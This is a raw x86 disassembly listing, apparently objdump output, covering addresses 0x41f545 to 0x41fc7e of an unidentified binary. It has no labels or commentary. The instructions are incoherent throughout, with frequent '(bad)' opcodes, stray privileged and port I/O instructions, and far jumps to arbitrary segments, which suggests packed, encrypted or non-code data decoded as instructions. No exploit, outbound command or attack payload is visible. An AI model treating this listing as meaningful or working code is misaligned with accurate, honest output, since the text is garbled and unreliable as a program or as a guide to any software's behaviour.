  41f545:	fistp  WORD PTR [bx+di+0x7c60]
  41f54a:	mov    bl,al
  41f54c:	and    al,0x3c
  41f54e:	lods   al,BYTE PTR ds:[esi]
  41f54f:	adc    edi,eax
  41f551:	push   0xffffffe5
  41f553:	mov    bh,0xcd
  41f555:	lods   al,BYTE PTR ds:[esi]
  41f556:	neg    BYTE PTR [edx+0x5a5185fe]
  41f55c:	popf   
  41f55d:	sar    BYTE PTR [edx],cl
  41f55f:	and    al,0x75
  41f561:	out    0xdb,eax
  41f563:	xchg   ebx,eax
  41f564:	arpl   si,bp
  41f566:	pusha  
  41f567:	jo     0x41f517
  41f569:	and    al,0x46
  41f56b:	lahf   
  41f56c:	repnz sti 
  41f56e:	jo     0x41f505
  41f570:	ret    
  41f571:	inc    ebx
  41f572:	dec    ecx
  41f573:	ins    BYTE PTR es:[edi],dx
  41f574:	or     eax,0xe10e383b
  41f579:	retf   
  41f57a:	jo     0x41f50b
  41f57c:	popa   
  41f57d:	addr16 es call 0xc477:0x6e031686
  41f586:	and    DWORD PTR [esi+edi*1],eax
  41f589:	aam    0x52
  41f58b:	neg    BYTE PTR [edi+0xe6f1595]
  41f591:	sbb    ebp,eax
  41f593:	int    0xf5
  41f595:	xor    DWORD PTR [ebx-0x57],0x4f868e18
  41f59c:	xchg   ecx,eax
  41f59d:	stos   BYTE PTR es:[edi],al
  41f59e:	sub    dh,al
  41f5a0:	and    cl,BYTE PTR [ecx-0x242009c]
  41f5a6:	(bad)  
  41f5a7:	fxch   st(2)
  41f5a9:	mov    dl,0xa4
  41f5ab:	cmc    
  41f5ac:	or     al,0x3d
  41f5ae:	jl     0x41f58b
  41f5b0:	pop    edi
  41f5b1:	adc    cl,ah
  41f5b3:	sbb    esi,ebp
  41f5b5:	fcomp  QWORD PTR [ecx+0x7e4fd21c]
  41f5bb:	clc    
  41f5bc:	jo     0x41f561
  41f5be:	xchg   ebx,eax
  41f5bf:	push   ebx
  41f5c0:	fbstp  TBYTE PTR [edx+0x6e8a6da1]
  41f5c6:	adc    esp,DWORD PTR [esi+eax*1]
  41f5c9:	popf   
  41f5ca:	push   0x70
  41f5cc:	std    
  41f5cd:	mov    ds:0x1cb9246d,eax
  41f5d2:	push   ss
  41f5d3:	sbb    eax,0xb1359d03
  41f5d8:	mov    bh,0x4b
  41f5da:	push   edx
  41f5db:	test   eax,0x82b50b8b
  41f5e0:	push   0x7f
  41f5e2:	sbb    DWORD PTR [eax],edx
  41f5e4:	mul    al
  41f5e6:	(bad)  
  41f5e7:	cmp    edi,esi
  41f5e9:	(bad)  
  41f5ea:	push   ecx
  41f5eb:	adc    ebp,0xffffffca
  41f5ee:	loop   0x41f611
  41f5f0:	cmp    DWORD PTR [edx+0x26],ebx
  41f5f3:	in     eax,dx
  41f5f4:	hlt    
  41f5f5:	ds (bad) 
  41f5f7:	xchg   esi,eax
  41f5f8:	push   edi
  41f5f9:	jne    0x41f5b4
  41f5fb:	or     ah,BYTE PTR [edi]
  41f5fd:	mov    edi,0x6bb37955
  41f602:	or     DWORD PTR [edx+0x3e],edx
  41f605:	jmp    0xf5756cc8
  41f60a:	adc    edx,DWORD PTR [eax]
  41f60c:	shr    DWORD PTR [ebx+edi*1+0x5c],0x18
  41f611:	scas   eax,DWORD PTR es:[edi]
  41f612:	cmp    esp,eax
  41f614:	dec    edx
  41f615:	push   0x51d10a65
  41f61a:	add    DWORD PTR [eax+ebx*2],esp
  41f61d:	pop    esi
  41f61e:	jno    0x41f5b3
  41f620:	pop    ebp
  41f621:	sub    al,0xde
  41f623:	dec    eax
  41f624:	pop    edx
  41f625:	sub    DWORD PTR [edi+0x4c],esp
  41f628:	xor    BYTE PTR [edi-0x54],dh
  41f62b:	push   edi
  41f62c:	ins    BYTE PTR es:[edi],dx
  41f62d:	test   BYTE PTR [edi+0x33f961be],dh
  41f633:	mov    al,0xcd
  41f635:	mov    bl,BYTE PTR [eax]
  41f637:	cmp    eax,0xaf6bd5d6
  41f63c:	adc    edx,DWORD PTR [eax]
  41f63e:	loope  0x41f6a4
  41f640:	or     bh,cl
  41f642:	pusha  
  41f643:	push   edx
  41f644:	gs test al,0xf7
  41f647:	pop    ecx
  41f648:	mov    esp,0x1fc3a431
  41f64d:	addr16 jne 0x41f629
  41f650:	retf   
  41f651:	not    BYTE PTR [eax]
  41f653:	lahf   
  41f654:	aam    0xb2
  41f656:	pusha  
  41f657:	dec    edi
  41f658:	(bad)  
  41f659:	out    dx,al
  41f65a:	xor    esp,DWORD PTR [edi]
  41f65c:	jmp    0xebe6482c
  41f661:	jnp    0x41f661
  41f663:	shl    DWORD PTR [edx],cl
  41f665:	mov    edi,0x354f1c1f
  41f66a:	jb     0x41f679
  41f66c:	mov    ebp,0x7811e65c
  41f671:	mov    DWORD PTR [edi-0x3f2436f1],esp
  41f677:	jecxz  0x41f67d
  41f679:	retf   
  41f67a:	inc    ecx
  41f67b:	or     al,ah
  41f67d:	retf   0xf699
  41f680:	cmc    
  41f681:	xchg   DWORD PTR [edx+0x787ee720],eax
  41f687:	ret    0x777f
  41f68a:	test   DWORD PTR [ebp+ebp*2+0x6e],eax
  41f68e:	xor    al,0x33
  41f690:	cmp    edx,DWORD PTR [edi+0x5a]
  41f693:	ret    
  41f694:	(bad)  
  41f695:	test   eax,0xebd2348f
  41f69a:	int3   
  41f69b:	ins    BYTE PTR es:[edi],dx
  41f69c:	xor    eax,0xb71016db
  41f6a1:	push   ss
  41f6a2:	cmp    bl,BYTE PTR [ebx]
  41f6a4:	out    0x4c,al
  41f6a6:	xchg   edi,eax
  41f6a7:	retf   0xfca8
  41f6aa:	dec    eax
  41f6ab:	lock into 
  41f6ad:	js     0x41f665
  41f6af:	xchg   edx,eax
  41f6b0:	sbb    al,0x50
  41f6b2:	xor    eax,0xd199e04d
  41f6b7:	imul   DWORD PTR [ebx+0x20]
  41f6ba:	shr    BYTE PTR [ebx-0x71f8bbdf],1
  41f6c0:	rcr    DWORD PTR [ebp+0x39],0x51
  41f6c4:	dec    esi
  41f6c5:	mov    edx,0xd004883e
  41f6ca:	or     eax,0xa60390a6
  41f6cf:	lods   al,BYTE PTR ss:[esi]
  41f6d1:	or     edx,DWORD PTR fs:[ecx+0x77]
  41f6d5:	lods   al,BYTE PTR ds:[esi]
  41f6d6:	out    0x99,eax
  41f6d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d9:	(bad)  [ebp-0x27]
  41f6dc:	nop
  41f6dd:	leave  
  41f6de:	call   0xc7eed8e1
  41f6e3:	xchg   BYTE PTR [ecx-0x2ec91509],ah
  41f6e9:	push   edi
  41f6ea:	fcmovnbe st,st(0)
  41f6ec:	ret    
  41f6ed:	pop    ds
  41f6ee:	sub    dh,0x7
  41f6f1:	repnz sub al,0x32
  41f6f4:	pop    ecx
  41f6f5:	pop    edx
  41f6f6:	or     bl,BYTE PTR [ebp+0x78]
  41f6f9:	mov    bh,0x51
  41f6fb:	add    eax,0x81bcdff2
  41f700:	jmp    0x1587:0x1449d5dc
  41f707:	inc    edi
  41f708:	ret    0xab8f
  41f70b:	cmp    al,0x24
  41f70d:	pop    ss
  41f70e:	and    DWORD PTR cs:[esi+0x5c],0xbe97ed89
  41f716:	jnp    0x41f749
  41f718:	and    esp,DWORD PTR [eax]
  41f71a:	ret    
  41f71b:	push   ss
  41f71c:	inc    ebx
  41f71d:	jns    0x41f74d
  41f71f:	push   edi
  41f720:	dec    ecx
  41f721:	retf   0xfd8f
  41f724:	inc    edi
  41f725:	ins    BYTE PTR es:[edi],dx
  41f726:	aam    0xc7
  41f728:	sbb    ah,BYTE PTR [ecx-0x29c4ce67]
  41f72e:	push   cs
  41f72f:	xor    ch,BYTE PTR [ecx+0x40caa682]
  41f735:	sub    BYTE PTR [esi+0x32],bl
  41f738:	mov    esi,edx
  41f73a:	retf   
  41f73b:	inc    ebx
  41f73c:	sidtd  ds:0x8cfb6a59
  41f743:	add    al,0x89
  41f745:	aaa    
  41f746:	jae    0x41f718
  41f748:	jl     0x41f726
  41f74a:	fidivr WORD PTR [ecx-0x58]
  41f74d:	inc    ecx
  41f74e:	jp     0x41f6e1
  41f750:	mov    esp,0xa101068f
  41f755:	or     eax,0xcbb821f4
  41f75a:	neg    DWORD PTR [eax]
  41f75c:	es push esp
  41f75e:	mov    esp,0x647e448b
  41f763:	clc    
  41f764:	daa    
  41f765:	push   ebx
  41f766:	aam    0x84
  41f768:	inc    ecx
  41f769:	lahf   
  41f76a:	fist   DWORD PTR [edi-0xb]
  41f76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76e:	fld    QWORD PTR [ebp+0x2a2cee0a]
  41f774:	scas   al,BYTE PTR es:[edi]
  41f775:	cmp    eax,0x98be3cc0
  41f77a:	iret   
  41f77b:	cs retf 0x2b1c
  41f77f:	mov    ch,BYTE PTR [ecx+0x1fb7aa2a]
  41f785:	adc    esp,DWORD PTR [edi+0x1ca24a36]
  41f78b:	cdq    
  41f78c:	scas   al,BYTE PTR es:[edi]
  41f78d:	add    al,0x3
  41f78f:	ins    DWORD PTR es:[edi],dx
  41f790:	pop    esp
  41f791:	ss push 0x96680507
  41f797:	mov    dl,0x3
  41f799:	loop   0x41f74a
  41f79b:	mov    ch,0x7b
  41f79d:	push   ss
  41f79e:	outs   dx,BYTE PTR ds:[esi]
  41f79f:	pop    edx
  41f7a0:	fistp  WORD PTR [esi-0x7]
  41f7a3:	pushw  ds
  41f7a5:	(bad)  
  41f7a6:	bound  ecx,QWORD PTR [edx+0x5ec8abff]
  41f7ac:	inc    ecx
  41f7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ae:	ret    
  41f7af:	or     ebx,DWORD PTR [ebx-0x66d5e18]
  41f7b5:	cpuid  
  41f7b7:	or     DWORD PTR [eax+0x3b],esi
  41f7ba:	sar    BYTE PTR [edi],1
  41f7bc:	push   0x21
  41f7be:	mov    esp,0xe18fd924
  41f7c3:	repz or DWORD PTR [ecx-0x64],esp
  41f7c7:	or     dh,BYTE PTR [ebx]
  41f7c9:	jb     0x41f7f0
  41f7cb:	outs   dx,BYTE PTR ds:[esi]
  41f7cc:	mov    al,0xa5
  41f7ce:	repz jmp 0xdb83c17
  41f7d4:	mov    dh,0xb3
  41f7d6:	ret    
  41f7d7:	jae    0x41f7a6
  41f7d9:	adc    esi,DWORD PTR [ecx-0x24]
  41f7dc:	call   0x52dc9610
  41f7e1:	mov    eax,0x8284b66
  41f7e6:	push   edx
  41f7e7:	or     DWORD PTR [eax+eax*2+0x4a],0xffffffb2
  41f7ec:	and    BYTE PTR [ecx-0x63],dh
  41f7ef:	les    edi,FWORD PTR [edi-0xa]
  41f7f2:	(bad)
  41f7f5:	gs mov ebx,0xf6ed50b7
  41f7fb:	mov    esp,0x38e71ca1
  41f800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f801:	mov    dh,0x15
  41f803:	js     0x41f83b
  41f805:	jecxz  0x41f7d1
  41f807:	hlt    
  41f808:	out    dx,al
  41f809:	mov    bh,0xc2
  41f80b:	fidivr WORD PTR [eax]
  41f80d:	stc    
  41f80e:	les    eax,FWORD PTR [esi]
  41f810:	out    0xe8,al
  41f812:	sub    BYTE PTR [ebx],cl
  41f814:	adc    bh,BYTE PTR [edi-0x7a7e7581]
  41f81a:	cmc    
  41f81b:	outs   dx,BYTE PTR ds:[esi]
  41f81c:	shl    al,0x82
  41f81f:	cmp    DWORD PTR [ecx+ebx*4+0x48a3b4b8],ebp
  41f826:	or     ah,BYTE PTR [ecx]
  41f828:	jb     0x41f7bb
  41f82a:	cs pop ss
  41f82c:	mov    edx,0xfa137830
  41f831:	in     al,0xd6
  41f833:	dec    eax
  41f834:	scas   eax,DWORD PTR es:[edi]
  41f835:	dec    ecx
  41f836:	adc    al,BYTE PTR [edi+ebx*2+0x37]
  41f83a:	pusha  
  41f83b:	sar    DWORD PTR [ecx+0x49],1
  41f83e:	adc    bh,ch
  41f840:	xchg   DWORD PTR [edx+0x1765009d],ebp
  41f846:	in     al,0x79
  41f848:	int    0x41
  41f84a:	cli    
  41f84b:	loopne 0x41f8ac
  41f84d:	push   cs
  41f84e:	jle    0x41f880
  41f850:	imul   ebx,DWORD PTR [edx+0xfb0e5eb],0xffffffd4
  41f857:	xlat   BYTE PTR ds:[ebx]
  41f858:	xor    BYTE PTR [ebx-0xa],ah
  41f85b:	mov    eax,0xfa86b0b8
  41f860:	(bad)  
  41f861:	dec    esp
  41f862:	mov    DWORD PTR [edx-0x44],edi
  41f865:	pop    ebx
  41f866:	sahf   
  41f867:	(bad)  
  41f868:	adc    DWORD PTR [eax],ebp
  41f86a:	inc    esp
  41f86b:	mov    esi,DWORD PTR [ecx+0x4560a270]
  41f871:	cmp    al,0x2a
  41f873:	fwait
  41f874:	jmp    0x6fa2:0xe544c7c4
  41f87b:	lods   eax,DWORD PTR ds:[esi]
  41f87c:	fistp  DWORD PTR [edi+eiz*8-0x73]
  41f880:	adc    eax,0x8375af02
  41f885:	mov    edi,0x49c6dc30
  41f88a:	dec    esi
  41f88b:	icebp  
  41f88c:	fbstp  TBYTE PTR [eax-0x49]
  41f88f:	add    edi,DWORD PTR [eax-0x42]
  41f892:	xchg   edi,eax
  41f893:	xor    BYTE PTR [eax+edi*4],ah
  41f896:	pop    eax
  41f897:	scas   eax,DWORD PTR es:[edi]
  41f898:	inc    ecx
  41f899:	xchg   BYTE PTR [ebp-0x8],dl
  41f89c:	jge    0x41f83a
  41f89e:	repz xchg ecx,eax
  41f8a0:	mov    WORD PTR [ecx],fs
  41f8a2:	iret   
  41f8a3:	xor    al,0xc8
  41f8a5:	stc    
  41f8a6:	jne    0x41f8d8
  41f8a8:	cs mov al,0xc4
  41f8ab:	pop    edx
  41f8ac:	pop    ebp
  41f8ad:	jmp    0x41f8cb
  41f8af:	fist   DWORD PTR [edi-0x3254452f]
  41f8b5:	jmp    0x41f87b
  41f8b7:	jp     0x41f8ef
  41f8b9:	fbld   TBYTE PTR [edi-0xd69c88c]
  41f8bf:	std    
  41f8c0:	mov    cl,0xf8
  41f8c2:	retf   
  41f8c3:	pop    edx
  41f8c4:	push   ebp
  41f8c5:	mov    ch,0x49
  41f8c7:	pop    edx
  41f8c8:	lea    ebp,[edi]
  41f8ca:	aad    0x2b
  41f8cc:	xchg   DWORD PTR [edx-0x4e],esp
  41f8cf:	push   edi
  41f8d0:	push   eax
  41f8d1:	(bad)  
  41f8d2:	cli    
  41f8d3:	and    BYTE PTR [ebx],cl
  41f8d5:	pop    edi
  41f8d6:	and    bl,bh
  41f8d8:	clc    
  41f8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8da:	xchg   ebp,eax
  41f8db:	test   DWORD PTR [ebx-0x45],esp
  41f8de:	mov    esi,0xcf0b6119
  41f8e3:	xor    DWORD PTR [ecx-0x11ab7518],0xffffffaa
  41f8ea:	or     eax,0x17212b31
  41f8ef:	inc    esi
  41f8f0:	sbb    eax,0xc872fcce
  41f8f5:	mov    eax,ds:0x2cb94263
  41f8fa:	sub    BYTE PTR [edx],bl
  41f8fc:	pop    ss
  41f8fd:	xor    ch,BYTE PTR [edi-0x37cf0eb]
  41f903:	aas    
  41f904:	pop    ebp
  41f905:	lea    eax,[ecx]
  41f907:	data16 repnz cmc 
  41f90a:	adc    esp,eax
  41f90c:	adc    al,0x48
  41f90e:	xchg   ebp,eax
  41f90f:	loope  0x41f95d
  41f911:	jno    0x41f930
  41f913:	xchg   esp,eax
  41f914:	inc    edx
  41f915:	xor    edx,DWORD PTR [esi+eiz*4]
  41f918:	jp     0x41f8e8
  41f91a:	ss xchg ecx,eax
  41f91c:	test   al,0x6f
  41f91e:	ficomp DWORD PTR [ecx-0x77]
  41f921:	push   ebp
  41f922:	mov    edx,ecx
  41f924:	or     eax,0xc8222231
  41f929:	aas    
  41f92a:	fsub   DWORD PTR [edx]
  41f92c:	nop
  41f92d:	push   ebx
  41f92e:	jbe    0x41f8b0
  41f930:	push   ebp
  41f931:	imul   eax,esi,0x3c
  41f934:	loope  0x41f908
  41f936:	inc    esi
  41f937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f938:	mov    dh,0xa
  41f93a:	test   BYTE PTR [esi+0xafaa896],0xcf
  41f941:	mov    al,0x36
  41f943:	pop    ecx
  41f944:	aas    
  41f945:	pop    ds
  41f946:	loop   0x41f972
  41f948:	loope  0x41f8f0
  41f94a:	iret   
  41f94b:	and    al,0xce
  41f94d:	ins    BYTE PTR es:[edi],dx
  41f94e:	or     BYTE PTR [ecx+ebx*1-0x5b7f7205],ch
  41f955:	adc    BYTE PTR [edi],al
  41f957:	xor    eax,0x86e84605
  41f95c:	cwde   
  41f95d:	into   
  41f95e:	xchg   BYTE PTR [ebp+0x27],cl
  41f961:	jo     0x41f96d
  41f963:	sbb    al,0x17
  41f965:	std    
  41f966:	xor    dh,BYTE PTR [ebx]
  41f968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f969:	test   eax,0x1aa40eeb
  41f96e:	ins    BYTE PTR es:[edi],dx
  41f96f:	jnp    0x41f95d
  41f971:	je     0x41f9cf
  41f973:	scas   eax,DWORD PTR es:[edi]
  41f974:	fadd   st,st(5)
  41f976:	xor    cl,BYTE PTR [eax]
  41f978:	jmp    0x5e05:0x5a2df57a
  41f97f:	out    dx,al
  41f980:	bound  ebx,QWORD PTR [ebp+ecx*8-0x69]
  41f984:	aad    0x6e
  41f986:	imul   edx,DWORD PTR [edi-0x621fa101],0x46
  41f98d:	dec    eax
  41f98e:	lea    edi,ds:0x9ac95522
  41f994:	push   ebx
  41f995:	sub    esi,DWORD PTR [edi+0x711ec8a3]
  41f99b:	xchg   DWORD PTR [esi],edx
  41f99d:	add    al,dl
  41f99f:	test   eax,0x565420f2
  41f9a4:	mov    eax,DWORD PTR [edi-0x55a3a976]
  41f9aa:	dec    eax
  41f9ab:	mov    bl,0x19
  41f9ad:	ret    0x100b
  41f9b0:	out    0x5e,al
  41f9b2:	push   ss
  41f9b3:	add    eax,0x2c363463
  41f9b8:	aad    0xc9
  41f9ba:	adc    eax,0xa1ae405b
  41f9bf:	inc    eax
  41f9c0:	imul   ebp,DWORD PTR [esi+0x77989014],0x527251b5
  41f9ca:	loopne 0x41fa2c
  41f9cc:	mov    eax,0x20a73679
  41f9d1:	and    BYTE PTR [ebp-0x42],ch
  41f9d4:	int    0x57
  41f9d6:	popf   
  41f9d7:	xor    eax,0xd66bebce
  41f9dc:	shl    ebx,1
  41f9de:	and    al,0x2e
  41f9e0:	clc    
  41f9e1:	ins    BYTE PTR es:[edi],dx
  41f9e2:	sub    eax,0x7aa89671
  41f9e7:	pop    ebx
  41f9e8:	mov    esp,0x9476b0cd
  41f9ed:	add    eax,0xfd2a44b1
  41f9f2:	pop    esp
  41f9f3:	add    edx,0xffffffac
  41f9f6:	push   ebx
  41f9f7:	push   0x35
  41f9f9:	pop    ebx
  41f9fa:	or     BYTE PTR [ecx-0x7f],0xe5
  41f9fe:	outs   dx,BYTE PTR ds:[esi]
  41f9ff:	imul   edx,DWORD PTR [edi+eax*4-0x1e8b738c],0xffffffeb
  41fa07:	mov    ah,0xa9
  41fa09:	fwait
  41fa0a:	hlt    
  41fa0b:	stos   BYTE PTR es:[edi],al
  41fa0c:	and    DWORD PTR [esi+0x7e9ba672],0x79
  41fa13:	mov    ah,0xf4
  41fa15:	jle    0x41fa45
  41fa17:	adc    BYTE PTR [edx+0x39],ah
  41fa1a:	cmp    esp,esp
  41fa1c:	mov    al,0x6c
  41fa1e:	mov    WORD PTR [ebx-0x28],cs
  41fa21:	xor    eax,0xe306c96d
  41fa26:	or     DWORD PTR [edi+0x69],edi
  41fa29:	sbb    al,0x54
  41fa2b:	fs xchg ebx,eax
  41fa2d:	xchg   ebx,eax
  41fa2e:	pop    ss
  41fa2f:	xchg   esp,eax
  41fa30:	inc    ebx
  41fa31:	dec    edi
  41fa32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa33:	dec    ebx
  41fa34:	popf   
  41fa35:	pop    ebp
  41fa36:	ins    DWORD PTR es:[edi],dx
  41fa37:	sub    eax,edx
  41fa39:	ss sbb al,0x70
  41fa3c:	not    BYTE PTR [edx+0x37]
  41fa3f:	add    edx,0x32c120e1
  41fa45:	test   edi,0x704532af
  41fa4b:	inc    ebx
  41fa4c:	add    eax,DWORD PTR [edi+0x2f]
  41fa4f:	sub    esi,DWORD PTR [edx-0x2ba8f637]
  41fa55:	aas    
  41fa56:	mov    edx,0x39f57b8d
  41fa5b:	xor    al,bh
  41fa5d:	leave  
  41fa5e:	clc    
  41fa5f:	xchg   esp,eax
  41fa60:	mov    edi,0xdc155ba1
  41fa65:	retf   
  41fa66:	pop    es
  41fa67:	mov    esi,0xdd4166c5
  41fa6c:	inc    ecx
  41fa6d:	or     eax,DWORD PTR [ebx+0x2c]
  41fa70:	aam    0x34
  41fa72:	jb     0x41faba
  41fa74:	push   ds
  41fa75:	out    0x5d,al
  41fa77:	jle    0x41fa7a
  41fa79:	out    dx,al
  41fa7a:	push   esp
  41fa7b:	into   
  41fa7c:	push   es
  41fa7d:	dec    eax
  41fa7e:	call   0x28bd2f9c
  41fa83:	mov    es,WORD PTR [eax-0x12]
  41fa86:	enter  0xa765,0x7d
  41fa8a:	mov    ah,0x8e
  41fa8c:	in     eax,dx
  41fa8d:	ins    BYTE PTR es:[edi],dx
  41fa8e:	out    0x10,al
  41fa90:	sbb    ebp,DWORD PTR [edi-0x1]
  41fa93:	push   cs
  41fa94:	mov    fs,WORD PTR [edx-0x7a]
  41fa97:	sbb    al,0x6d
  41fa99:	jge    0x41fab2
  41fa9b:	clc    
  41fa9c:	mov    ecx,0x939d79e6
  41faa1:	xor    al,BYTE PTR [edi]
  41faa3:	jnp    0x41fa93
  41faa5:	sbb    ch,BYTE PTR ds:0x30a0599c
  41faab:	es enter 0x1d3c,0x68
  41fab0:	(bad)  [eax-0x75]
  41fab3:	adc    BYTE PTR [edx+0x3077883d],ah
  41fab9:	sti    
  41faba:	pop    ecx
  41fabb:	push   es
  41fabc:	cli    
  41fabd:	pop    ds
  41fabe:	push   ebx
  41fabf:	jbe    0x41fa46
  41fac1:	and    eax,0x8a891ed2
  41fac6:	aas    
  41fac7:	adc    edi,ebx
  41fac9:	dec    edi
  41faca:	inc    esi
  41facb:	push   0xb52aaa50
  41fad0:	out    0xed,eax
  41fad2:	or     ecx,DWORD PTR [edi-0x61]
  41fad5:	sbb    esp,ecx
  41fad7:	iret   
  41fad8:	in     al,0x2c
  41fada:	mov    cl,0xe0
  41fadc:	cmp    DWORD PTR [ebp+edx*1-0x76],ebx
  41fae0:	cmp    esi,edi
  41fae2:	shl    BYTE PTR [ecx-0x45d05083],cl
  41fae8:	repnz mov cl,0x4
  41faeb:	das    
  41faec:	inc    ebp
  41faed:	pusha  
  41faee:	cmc    
  41faef:	cwde   
  41faf0:	inc    esp
  41faf1:	mov    cl,0x24
  41faf3:	sbb    bl,BYTE PTR [ebx]
  41faf5:	mov    ds:0x6c304c0b,eax
  41fafa:	push   ebp
  41fafb:	xchg   BYTE PTR [ecx-0xb0d114d],bl
  41fb01:	das    
  41fb02:	shl    DWORD PTR [ecx+0x28c2df85],cl
  41fb08:	adc    eax,0xa51d5e1e
  41fb0d:	aad    0x11
  41fb0f:	lds    edi,FWORD PTR [eax]
  41fb11:	aam    0xb7
  41fb13:	pop    es
  41fb14:	cmp    ah,BYTE PTR ds:[ebx]
  41fb17:	mov    ecx,0xb47a6643
  41fb1c:	gs push 0xffffff8b
  41fb1f:	call   0x48cdf40
  41fb24:	fnstcw WORD PTR ds:0x9465f10a
  41fb2a:	mov    ebp,0x4b8f5467
  41fb2f:	dec    edx
  41fb30:	xchg   esi,eax
  41fb31:	inc    ecx
  41fb32:	dec    edi
  41fb33:	ficom  WORD PTR [edx]
  41fb35:	retf   
  41fb36:	je     0x41fb5e
  41fb38:	or     dl,BYTE PTR ds:0x85cc0626
  41fb3e:	mov    cl,0x78
  41fb40:	jne    0x41fb4b
  41fb42:	pop    esp
  41fb43:	pop    ebp
  41fb44:	mov    al,ds:0x5de58bcd
  41fb4a:	fstp   TBYTE PTR [edx+eiz*8+0x54]
  41fb4e:	out    0x77,eax
  41fb50:	stos   DWORD PTR es:[edi],eax
  41fb51:	inc    eax
  41fb52:	and    dl,0x67
  41fb55:	mov    ?,edi
  41fb57:	out    0x36,eax
  41fb59:	fsub   DWORD PTR [ebp+0x11]
  41fb5c:	or     bh,BYTE PTR [eax+0x70]
  41fb5f:	add    BYTE PTR [esp+eiz*8],bl
  41fb62:	mov    fs:0xf31a9728,eax
  41fb68:	pop    ebx
  41fb69:	or     eax,0x533f0ecc
  41fb6e:	(bad)
  41fb71:	jnp    0x41fb75
  41fb73:	dec    bl
  41fb75:	bound  eax,QWORD PTR [edi]
  41fb77:	mov    ecx,0x42f436b1
  41fb7c:	and    ebx,DWORD PTR [ebx]
  41fb7e:	rcl    DWORD PTR [ecx-0x2],1
  41fb81:	xchg   esp,eax
  41fb82:	cdq    
  41fb83:	ror    BYTE PTR [ecx+ecx*2-0x19],cl
  41fb87:	in     al,dx
  41fb88:	pop    ds
  41fb89:	or     DWORD PTR [ecx],edi
  41fb8b:	mov    ebp,0xf5963664
  41fb90:	rcl    DWORD PTR [ebx+0x36bdd2c8],0xfd
  41fb97:	fistp  WORD PTR [ecx]
  41fb99:	inc    ebx
  41fb9a:	(bad)  [esi]
  41fb9c:	cwde   
  41fb9d:	(bad)
  41fba0:	out    0x84,eax
  41fba2:	add    eax,ebx
  41fba4:	aas    
  41fba5:	in     eax,dx
  41fba6:	push   ds
  41fba7:	fdivp  st(1),st
  41fba9:	repnz mov ebx,0xa1bc0eef
  41fbaf:	dec    esi
  41fbb0:	jmp    0xecda:0x404421eb
  41fbb7:	js     0x41fb89
  41fbb9:	dec    ecx
  41fbba:	and    DWORD PTR [edx+0x2abfe4ef],edx
  41fbc0:	dec    ebp
  41fbc1:	pop    ebx
  41fbc2:	sbb    edx,DWORD PTR [ecx-0x7e22f326]
  41fbc8:	xchg   ebp,eax
  41fbc9:	aad    0xe5
  41fbcb:	jle    0x41fc30
  41fbcd:	pop    edi
  41fbce:	pop    esp
  41fbcf:	pop    ds
  41fbd0:	xchg   ecx,eax
  41fbd1:	ret    0xfabc
  41fbd4:	ds dec ecx
  41fbd6:	sbb    esi,DWORD PTR [ebp-0x71]
  41fbd9:	and    ah,cl
  41fbdb:	outs   dx,BYTE PTR ds:[esi]
  41fbdc:	stos   BYTE PTR es:[edi],al
  41fbdd:	out    0xeb,eax
  41fbdf:	cmc    
  41fbe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe1:	mov    edx,0x6192569a
  41fbe6:	jp     0x41fc46
  41fbe8:	call   0xeb60cf0e
  41fbed:	dec    eax
  41fbee:	mov    BYTE PTR [edi-0x58719a5c],bl
  41fbf4:	sbb    al,0x7c
  41fbf6:	inc    ecx
  41fbf7:	pop    ds
  41fbf8:	and    eax,edi
  41fbfa:	dec    esp
  41fbfb:	add    al,0xbf
  41fbfd:	out    0xc5,eax
  41fbff:	mov    edx,0xb36d2b87
  41fc04:	lds    ebx,FWORD PTR [ebp+ebp*4+0x2b]
  41fc08:	loope  0x41fb91
  41fc0a:	xor    DWORD PTR [ebx+0x6],ebp
  41fc0d:	cmc    
  41fc0e:	xchg   esi,eax
  41fc0f:	stos   DWORD PTR es:[edi],eax
  41fc10:	or     ah,BYTE PTR [ebp+edi*1-0x58]
  41fc14:	push   edx
  41fc15:	imul   esp,DWORD PTR [ecx],0xffffffe4
  41fc18:	pop    es
  41fc19:	mov    cl,0x6f
  41fc1b:	div    BYTE PTR [edi]
  41fc1d:	jns    0x41fc87
  41fc1f:	add    BYTE PTR [edi+0x7abc7bca],al
  41fc25:	xor    esi,DWORD PTR [ecx+eax*2-0x546fdb8b]
  41fc2c:	jmp    0x41fc05
  41fc2e:	and    ebx,ebx
  41fc30:	(bad)  
  41fc31:	hlt    
  41fc32:	add    dl,cl
  41fc34:	xchg   esi,eax
  41fc35:	out    0x7a,al
  41fc37:	imul   edi,DWORD PTR [ecx+0x39],0x71
  41fc3b:	pop    ds
  41fc3c:	stos   BYTE PTR es:[edi],al
  41fc3d:	jns    0x41fbd7
  41fc3f:	lahf   
  41fc40:	ret    
  41fc41:	shl    ebp,0x98
  41fc44:	pop    esp
  41fc45:	inc    ecx
  41fc46:	mov    dh,0xaf
  41fc48:	xor    BYTE PTR [eax+0x7f],ch
  41fc4b:	outs   dx,DWORD PTR ds:[esi]
  41fc4c:	xor    al,0x9b
  41fc4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc4f:	pop    esi
  41fc50:	mov    cl,0x78
  41fc52:	retf   
  41fc53:	push   ds
  41fc54:	pop    edx
  41fc55:	sbb    al,0x64
  41fc57:	adc    eax,0x26b26c02
  41fc5c:	test   BYTE PTR [ecx+0xb],dh
  41fc5f:	xor    ebp,edx
  41fc61:	cmp    eax,0xa47dcf43
  41fc66:	xchg   DWORD PTR [ebx],edx
  41fc68:	neg    DWORD PTR [ecx]
  41fc6a:	pop    edx
  41fc6b:	rdmsr  
  41fc6d:	lods   al,BYTE PTR ds:[esi]
  41fc6e:	(bad)  
  41fc6f:	lahf   
  41fc70:	scas   eax,DWORD PTR es:[edi]
  41fc71:	cwde   
  41fc72:	push   0x12
  41fc74:	add    dh,BYTE PTR [edi+0x3f]
  41fc77:	and    al,0xdd
  41fc79:	fnstenv [ecx]
  41fc7b:	or     BYTE PTR [edi-0x6c],ah
  41fc7e:	xor    ebp,ecx
